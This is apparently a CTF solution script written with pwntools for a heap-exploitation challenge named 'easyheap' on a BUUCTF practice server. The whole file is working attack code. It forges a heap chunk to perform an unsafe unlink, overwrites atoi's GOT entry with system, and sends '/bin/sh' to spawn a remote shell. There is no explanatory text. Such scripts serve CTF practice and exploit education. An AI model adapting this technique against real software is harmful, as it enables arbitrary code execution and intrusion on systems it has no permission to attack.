#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './easyheap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28858

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice :', str(1))
	sla(':', str(size))
	sa(':', data)
def md(idx, size, data):
	sla('Your choice :', str(2))
	sla(':', str(idx))
	sla(':', str(size))
	sa(':', data)
	
def rm(idx):
	sla('Your choice :', str(3))
	sla(':', str(idx))

def dp():
	sla('Your choice :', str(4869))
	#sla(':', str(4869))

def q():
	sla('Your choice :', str(4))
#--------------------------Exploit--------------------------
def exploit():
	parray = 0x6020E0
	ad(0x68, 'A' * 0x10)
	ad(0x68, 'B' * 0x10)
	ad(0x80, 'C' * 0x10)

	p = p64(0)
	p += p64(0x61)
	p += p64(parray + 8 - 0x18)
	p += p64(parray + 8 - 0x10)
	p += p64(0x60)
	p = p.ljust(0x60, '\x00')
	p += p64(0x60)
	p += '\x90'
	md(1, 0x80, p)
	rm(2)
	magic_num = 0x6020c0
	p = p64(0) * 2	
	p += p64(exe.got['atoi'])
	md(1, 0x20, p)
	p = p64(exe.plt['system'])
	md(0, 0x8, p)
	sl('/bin/sh')



	#db()
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
